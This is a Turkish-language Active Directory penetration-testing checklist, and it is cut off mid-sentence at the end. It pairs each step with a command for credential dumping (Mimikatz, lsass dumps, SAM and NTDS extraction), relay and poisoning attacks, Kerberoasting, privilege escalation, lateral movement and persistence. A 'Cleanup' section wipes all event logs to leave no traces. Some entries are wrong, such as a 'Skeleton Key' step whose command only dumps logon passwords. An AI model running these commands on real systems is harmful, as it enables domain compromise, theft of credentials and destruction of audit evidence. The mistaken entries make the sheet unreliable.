# Active Directory Pentest Checklist

## ✅ Credential Gathering
- [ ] Kullanıcı adlarını ve parolaları topla.
  - **Komut**: `rpcclient -U "" [DC-IP]`
- [ ] DC'deki misafir oturumlarını kontrol et.
  - **Komut**: `net use \\[DC-IP] /user:guest`
- [ ] LAPS (Local Administrator Password Solution) parolalarını kontrol et.
  - **Komut**: `powershell -command "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd"`
- [ ] Ntlmrelayx ile kimlik bilgilerini yakalamayı dene.
  - **Komut**: `python3 ntlmrelayx.py -smb2support`
- [ ] SAM dosyasını ele geçir ve analiz et.
  - **Komut**: `reg save hklm\sam sam.save`
- [ ] Cached Credentials için lsass belleğini analiz et.
  - **Komut**: `procdump.exe -ma lsass.exe`
- [ ] NTDS.dit dosyasını çıkar ve hashleri dump et.
  - **Komut**: `secretsdump.py -just-dc [user]:[password]@[IP]`
- [ ] Mimikatz kullanarak kimlik bilgilerini çıkar.
  - **Komut**: `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- [ ] Windows Credential Manager'dan kimlik bilgilerini topla.
  - **Komut**: `cmdkey /list`
- [ ] Group Policy Preferences (GPP) şifrelerini keşfet.
  - **Komut**: `findstr /S /I /C:"password" \\\[domain]\SYSVOL`
- [ ] Responder veya Inveigh ile kimlik bilgisi toplamayı dene.
  - **Komut**: `responder -I [network_interface]`
  - **PowerShell Komut**: `Invoke-Inveigh`
- [ ] Certify kullanarak Active Directory Certificate Services (ADCS) yapılandırmasını analiz et.
  - **Komut**: `Certify.exe find`
- [ ] LAPSToolkit ile LAPS yapılandırmasını keşfet.
  - **Komut**: `Get-LAPSComputers`
- [ ] KeeTheft ile Windows Credential Manager şifrelerini topla.
  - **Komut**: `KeeTheft.exe dump`
- [ ] SafetyKatz veya BetterSafetyKatz ile bellekten kimlik bilgisi dump et.
  - **Komut**: `SafetyKatz.exe sekurlsa::logonpasswords`
- [ ] KrbRelay veya KrbRelayUp kullanarak Kerberos relay saldırısını dene.
  - **Komut**: `KrbRelay.exe -dc-ip [DC-IP]`
- [ ] GMSAPasswordReader ile gMSA şifrelerini çıkar.
  - **Komut**: `GMSAPasswordReader.exe`

## ✅ Enumeration
- [ ] Domain kullanıcılarını listele.
  - **Komut**: `Get-ADUser -Filter *`
- [ ] Domain gruplarını kontrol et.
  - **Komut**: `Get-ADGroup -Filter *`
- [ ] Domain Controller (DC) yapılandırmasını kontrol et.
  - **Komut**: `nltest /dclist:domainname`
- [ ] LDAP bağlantılarını kontrol et.
  - **Komut**: `ldapsearch -x -H ldap://[DC-IP] -b "DC=domain,DC=com"`
- [ ] GPO (Group Policy Objects) ayarlarını incele.
  - **Komut**: `gpresult /h report.html`
- [ ] Forest ve Domain Trust ilişkilerini analiz et.
  - **Komut**: `Get-ADTrust -Filter *`
- [ ] Domain Policy bilgilerini kontrol et.
  - **Komut**: `Get-DomainPolicy`
- [ ] Açık paylaşımları (Shares) listele.
  - **Komut**: `net view \\[IP]`
- [ ] Kerberos SPN'leri listele.
  - **Komut**: `GetUserSPNs.py -request -dc-ip [DC-IP] [domain/user]`
- [ ] SharpHound ile AD ortamını analiz et.
  - **Komut**: `SharpHound.exe -c All`
- [ ] ADRecon ile detaylı raporlama yap.
  - **Komut**: `ADRecon.ps1`
- [ ] PowerView kullanarak AD bilgilerini incele.
  - **Komut**: `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`
- [ ] bloodyAD ile AD yapılandırmasını analiz et.
  - **Komut**: `bloodyAD -u [user] -p [password] -d [domain]`
- [ ] SharpView ile AD nesnelerini detaylı analiz et.
  - **Komut**: `SharpView.exe`
- [ ] ADFSDump kullanarak ADFS yapılandırmasını analiz et.
  - **Komut**: `ADFSDump.exe`

## ✅ Lateral Movement
- [ ] Uzak masaüstü protokolü (RDP) üzerinden bağlantı.
  - **Komut**: `mstsc /v:[IP]`
- [ ] Pass-The-Hash saldırıları için NTLM hashlerini kullan.
  - **Komut**: `impacket-psexec [user]:[hash]@[IP]`
- [ ] PrintSpoofer ile yetki yükseltme yap.
  - **Komut**: `PrintSpoofer.exe -i`
- [ ] JuicyPotato veya GodPotato kullanarak hak yükseltme yap.
  - **Komut**: `JuicyPotato.exe -t *`
- [ ] PetitPotam saldırısını gerçekleştir.
  - **Komut**: `PetitPotam.py -d [domain] -u [user] -p [password]`
- [ ] SharpMove ile lateral movement gerçekleştirin.
  - **Komut**: `SharpMove.exe -d [domain] -u [user] -p [password]`
- [ ] RestrictedAdmin modunda RDP ile bağlantı.
  - **Komut**: `mstsc /restrictedadmin /v:[IP]`
- [ ] SharpRDP ile RDP saldırılarını test edin.
  - **Komut**: `SharpRDP.exe -target [IP] -u [user] -p [password]`
- [ ] NetworkServiceExploit ile ağ hizmetlerini hedef alarak lateral movement gerçekleştirin.
  - **Komut**: `NetworkServiceExploit.exe`

## ✅ Privilege Escalation
- [ ] Kerberoasting saldırılarını test et.
  - **Komut**: `GetUserSPNs.py -request -dc-ip [DC-IP] [domain/user]`
- [ ] Certify ile ADCS zafiyetlerini test et.
  - **Komut**: `Certify.exe request /ca:[CA Name]`
- [ ] Rubeus kullanarak Kerberos bileti oluştur.
  - **Komut**: `Rubeus.exe asktgt /user:[user] /rc4:[hash]`
- [ ] NoPac saldırısını test et.
  - **Komut**: `python3 noPac.py -dc-ip [DC-IP]`
- [ ] Powermad ile ACL düzenlemesi yaparak hak yükseltme yap.
  - **Komut**: `New-MachineAccount`
- [ ] SharpKatz ile bellekten hashleri dump et.
  - **Komut**: `SharpKatz.exe sekurlsa::logonpasswords`
- [ ] RunasCs ile yüksek haklara sahip bir kullanıcı olarak işlem başlat.
  - **Komut**: `RunasCs.exe -u [user] -p [password] -d [domain]`
- [ ] SharpUp ile yanlış yapılandırmaları kontrol ederek hak yükseltme yap.
  - **Komut**: `SharpUp.exe`
- [ ] Whisker ile Shadow Credentials oluştur ve kullan.
  - **Komut**: `Whisker.exe create /target:[user]`
- [ ] PassTheCert ile sertifika bazlı saldırılar gerçekleştir.
  - **Komut**: `PassTheCert.exe`

## ✅ Persistence
- [ ] AdminSDHolder özelliklerini kontrol et.
  - **Komut**: `Get-ADObject -Filter {name -eq "AdminSDHolder"}`
- [ ] Scheduled Task oluşturarak kalıcılık sağla.
  - **Komut**: `schtasks /create /tn [taskname] /tr [command] /sc onlogon`
- [ ] Skeleton Key yükleyerek DC'yi manipüle et.
  - **Komut**: `mimikatz "privilege::debug sekurlsa::logonpasswords"`
- [ ] Acl-Backdoor kullanarak kalıcı erişim sağla.
  - **Komut**: `Set-DomainObjectAcl`
- [ ] Shadow Credentials ile kalıcılık sağla.
  - **Komut**: `Whisker.exe create /target:[user]`
- [ ] Powermad ile yeni makine hesapları oluştur ve kontrolü ele geçir.
  - **Komut**: `New-MachineAccount`
- [ ] SharpChrome ile tarayıcı şifrelerini al ve kalıcılık sağla.
  - **Komut**: `SharpChrome.exe`

## ✅ Additional Checks
- [ ] ADCS (Active Directory Certificate Services) yapılandırmasını analiz et.
  - **Komut**: `certutil -dump`
- [ ] DNS Zone Transfer'ı kontrol et.
  - **Komut**: `dig @<DNS-Server> <domain> axfr`
- [ ] SMB Signing'in devre dışı olup olmadığını kontrol et.
  - **Komut**: `smbclient -L //[IP] -N`
- [ ] LLMNR ve NBT-NS zehirlenmesine karşı savunmasızlığı kontrol et.
  - **Komut**: `responder -I [network_interface] -w`
- [ ] MS17-010 (EternalBlue) zafiyetini test et.
  - **Komut**: `nmap -p445 --script smb-vuln-ms17-010 [IP]`
- [ ] PowerUp ile yanlış yapılandırmaları test et.
  - **Komut**: `PowerUp.ps1`
- [ ] Seatbelt ile endpoint konfigürasyonlarını incele.
  - **Komut**: `Seatbelt.exe all`

## ✅ Cleanup
- [ ] Kullanılan araç ve scriptleri sistemden temizle.
  - **Komut**: `del /q /f [scriptname]`
- [ ] Event Logs üzerinde iz bırakmamak için log temizle.
  - **Komut**: `Clear-EventLog -LogName *`
- [ ] Kullanıcı izlerini silmek için temporay dosyaları temizle.
  - **Komut**: `del /q /f %temp%\*`

Bu liste, Active Directory pentest işlemleri sırasında tüm aşamalarda kapsamlı bir rehber sunar. Her bölümde belirtilen araç ve komut
